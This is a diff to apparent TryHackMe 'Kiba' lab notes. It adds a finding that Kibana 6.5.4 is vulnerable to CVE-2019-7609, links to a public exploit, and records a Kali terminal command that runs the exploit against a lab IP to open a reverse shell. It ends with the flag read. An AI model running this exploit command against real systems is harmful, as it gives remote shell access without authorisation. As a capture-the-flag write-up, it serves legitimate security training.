@@ -40,8 +40,17 @@ PORT     STATE SERVICE
 
 Nmap done: 1 IP address (1 host up) scanned in 23.05 seconds
 
-## found Kibana Version: 6.5.4
+## Found Kibana Version: 6.5.4 vulnerable 
 link: https://systemweakness.com/this-kibana-vulnerability-can-give-you-rce-in-a-snap-kibana-cve-2019-7609-7de49112139e
+
+## Use exploit and get reverse shell
+link: https://github.com/LandGrey/CVE-2019-7609
+
+┌──(duke㉿kali)-[~/Documents/THM_Kiba]
+└─$ python2 CVE-2019-7609-kibana-rce.py -u http://10.10.124.166:5601 -host 10.x.x.x -port 4443 --shell 
+[+] http://10.10.124.166:5601 maybe exists CVE-2019-7609 (kibana < 6.6.1 RCE) vulnerability
+[+] reverse shell completely! please check session on: 10.x.x.x:4443
+                                                                           
 
 kiba@ubuntu:/home/kiba$ cat user.txt
 cat user.txt
